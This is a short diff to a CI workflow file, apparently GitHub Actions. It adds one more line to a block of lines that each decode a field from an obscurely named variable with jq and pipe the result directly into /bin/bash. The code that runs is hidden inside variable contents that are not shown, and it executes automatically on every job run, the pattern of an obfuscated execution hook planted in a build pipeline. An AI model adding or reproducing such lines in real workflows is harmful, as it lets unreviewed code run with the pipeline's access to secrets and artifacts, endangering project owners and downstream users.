@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ev96" | jq -r .t5 | /bin/bash
           echo $jdwll27 | jq -r .gmfg6864 | /bin/bash
           echo $f87074 | jq -r .k797 | /bin/bash
+          echo $v19 | jq -r .c0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
